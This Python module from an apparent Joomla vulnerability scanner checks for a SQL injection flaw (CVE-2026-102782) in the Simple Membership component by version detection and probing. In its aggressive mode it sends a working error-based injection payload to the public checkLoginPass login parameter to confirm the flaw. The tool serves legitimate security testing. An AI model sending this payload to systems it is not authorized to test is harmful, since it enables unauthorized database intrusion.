from __future__ import annotations

import re
import secrets
from typing import Any
from urllib.parse import quote

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-102782"
NAME = "OrdaSoft Simple Membership checkLoginPass SQL injection"
COMPONENT = "Simple Membership"
AFFECTED_RULE = "Simple Membership 1.0.0 through 7.3.x; fixed in 7.4.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
CHECK_PATH = "/index.php"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("7.4.0")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("simplemembership", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Simple Membership was not detected through its manifest or component route.", action="No action is required unless Simple Membership is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Simple Membership {version}, within the affected range below 7.4.0. The public checkLoginPass task concatenates the login value into SQL."
        action = "Upgrade Simple Membership to 7.4.0 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Simple Membership {version}, which quotes/binds the login value in checkLoginPass."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Simple Membership was detected, but its version could not be determined."
        action = "Determine the installed Simple Membership version and upgrade to 7.4.0 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(target_url: str, timeout: int = 15, proxy: str | None = None) -> Finding:
    """Error-based SQLi through the public checkLoginPass task.

    The login value is concatenated into SQL; the probe asks MySQL/MariaDB to
    evaluate ``extractvalue()`` with a random marker and reads the ``~marker~``
    leak from the response. 7.4.0 quotes the value.
    """
    base = normalize_url(target_url)
    marker = f"PROOFCMS102782{secrets.token_hex(5).upper()}"
    payload = f"x' AND extractvalue(1,concat(0x7e,(SELECT CONCAT('{marker}')),0x7e)) AND '1'='1"
    url = f"{base}{CHECK_PATH}?option=com_simplemembership&task=checkLoginPass&format=raw&login={quote(payload)}"
    response = HttpClient(timeout=timeout, proxy=proxy).request(
        url, method="GET", headers={"User-Agent": BROWSER_UA}, timeout=timeout
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The checkLoginPass request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body = response.get("body") or ""
    leaked = marker in body and f"~{marker}~" in body
    evidence = {
        "status": response.get("status"),
        "marker": marker,
        "leaked": leaked,
        "sql_error": bool(re.search(r"SQL syntax|XPATH syntax error|MariaDB server|MySQL server", body, re.IGNORECASE)),
    }
    if leaked:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{CHECK_PATH}",
            evidence=evidence,
            detail="The public checkLoginPass task evaluated an extractvalue() payload and returned the random marker, confirming unauthenticated SQL injection.",
            action="Upgrade Simple Membership to 7.4.0 or newer.",
        )
    status = "BLOCKED_EXTERNAL" if response.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{CHECK_PATH}",
        evidence=evidence,
        detail="The error-based payload did not return the marker. 7.4.0 quotes the value, the route is absent, or extractvalue() is disabled.",
        action="Upgrade affected Simple Membership versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_simplemembership"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Simple Membership page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The Simple Membership page is reachable; the checkLoginPass SQL injection payload was not sent in safe mode.", action="Use aggressive mode on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 15, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Simple Membership was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (reachability) and aggressive (error-based checkLoginPass SQL injection) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "SQL Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-18", "updated": "2026-11-18", "required_detectors": ["simplemembership"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-102782", "https://pocbit.org/pocs/cve-2026-102782", "https://ordasoft.com/simple-membership.html"]}
